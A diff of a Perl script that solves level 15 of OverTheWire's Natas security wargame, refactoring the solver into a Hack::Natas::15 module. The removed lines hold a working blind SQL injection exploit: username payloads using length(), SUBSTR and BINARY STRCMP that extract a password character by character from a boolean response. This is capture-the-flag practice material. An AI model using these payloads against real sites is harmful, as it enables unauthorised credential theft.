@@ -1,15 +1,13 @@
 #!/usr/bin/env perl
 use strict;
 use warnings;
-use v5.16.3;
+use v5.16.0;
 package
     natas15;
 # VERSION
 # ABSTRACT: solve level 15 of overthewire.org's Natas server-side security war games
 
-use Carp qw/ confess /;
-use URI;
-use HTTP::Tiny 0.034;
+use Hack::Natas::15;
 
 =head1 NAME
 
@@ -23,7 +21,7 @@ natas15 - solve level 15 of overthewire.org's Natas war games
 
 =over 4
 
-=item * C<--wrong>, --no-wrong
+=item * B<--wrong>, --no-wrong
 
 Use the wrong SQL to find the incorrect password.
 
@@ -41,6 +39,10 @@ if ($opts->{version}) {
     say __PACKAGE__ . ' version ' . (__PACKAGE__->VERSION // 'dev');
     exit;
 }
+unless (@ARGV == 1) {
+    require Pod::Usage;
+    Pod::Usage::pod2usage( -msg => 'Incorrect usage' );
+}
 
 =head1 DESCRIPTION
 
@@ -54,122 +56,10 @@ as the first argument on the command line
 
 =cut
 
-my $host = 'natas15.natas.labs.overthewire.org';
-my $uri  = URI->new(sprintf q{http://%s:%s@%s/index.php}, 'natas15', $ARGV[0], $host);
-my $u = HTTP::Tiny->new(
-    timeout => 5,
-    default_headers => { Host => $host },
-);
+my $hack = Hack::Natas::15->new(http_pass => shift @ARGV);
+local $SIG{INT} = sub { printf "\rPassword so far: %s\n", $hack->password_so_far; exit 1 };
+$hack->run;
 
-my $password_so_far = '';
-local $SIG{INT} = sub { print "\rPassword so far is: $password_so_far\n"; exit; };
-
-sub response_to_boolean {
-    my $r = shift;
-
-    if (!$r->{success}) {
-        use Data::Dumper;
-        confess Dumper {
-            response => $r,
-            password_so_far => $password_so_far,
-        };
-    }
-    elsif ($r->{content} =~ m/\QThis user exists/) {
-        return 1;
-    }
-    elsif ($r->{content} =~ m/\QThis user doesn't exist/) {
-        return;
-    }
-    else {
-        use Data::Dumper;
-        confess Dumper {
-            response => $r,
-            password_so_far => $password_so_far,
-        };
-    }
-}
-sub guess_length {
-    my $sql_fragment = q{natas16" and length(password) = %d #};
-
-    LENGTH:
-    foreach my $i (0..33) {
-        print "\rGuessing length: $i";
-        $uri->query_form({
-            debug => 1,
-            username => sprintf($sql_fragment, $i)
-        });
-        if ( response_to_boolean( $u->get($uri) ) ) {
-            return $i;
-        }
-        else {
-            next LENGTH;
-        }
-    }
-    confess "Couldn't determine length";
-}
-
-sub guess_next_char {
-    my $pos = shift;
-    my %sql = (
-        cmp => <<'SQL_FRAGMENT',
-natas16" and STRCMP(
-    SUBSTR(password, %d, 1),
-    '%s') = 0 #
-SQL_FRAGMENT
-        cmp_bin => <<'SQL_FRAGMENT',
-natas16" and STRCMP(
-    BINARY(SUBSTR(password, %d, 1)),
-    BINARY('%s')) = 0 #
-SQL_FRAGMENT
-    );
-    chomp for values %sql;
-
-    NUM:
-    foreach my $num (0..9) {
-        print "\rGuessing: ${password_so_far}${num}";
-        $uri->query_form({
-            debug => 1,
-            username => sprintf($sql{cmp}, $pos, "$num"),
-        });
-        return $num if response_to_boolean($u->get($uri));
-    }
-
-    CHAR:
-    foreach my $char ('a'..'z') {
-        print "\rGuessing: ${password_so_far}${char}";
-        $uri->query_form({
-            debug => 1,
-            username => sprintf($sql{cmp}, $pos, $char)
-        });
-
-        if (response_to_boolean($u->get($uri))) { # verify case
-            $uri->query_form({
-                debug => 1,
-                username => sprintf($sql{cmp_bin}, $pos, uc $char),
-            });
-            return response_to_boolean($u->get($uri)) ? uc $char : $char;
-        }
-    }
-    confess "Couldn't guess the next char; password so far is '$password_so_far'";
-}
-
-STDOUT->autoflush(1);
-my $length = guess_length();
-say "\rPassword length is $length";
-foreach my $pos (1 .. $length) {
-    $password_so_far .= guess_next_char( $pos );
-}
-
-say "\rPassword is '$password_so_far'; double-checking correctness...";
-
-my $sql_fragment = q/natas16" and STRCMP(BINARY(password), BINARY('%s')) = 0 #/;
-$uri->query_form({
-    debug => 1,
-    username => sprintf($sql_fragment, $password_so_far)
-});
-say response_to_boolean( $u->get($uri) )
-    ? 'Looks correct'
-    : 'Looks incorrect, actually';
 
 =head1 SEE ALSO
 
@@ -177,6 +67,6 @@ say response_to_boolean( $u->get($uri) )
 
 =item * L<natas16>
 
-=item * L<App::Natas>
+=item * L<Hack::Natas>
 
 =back
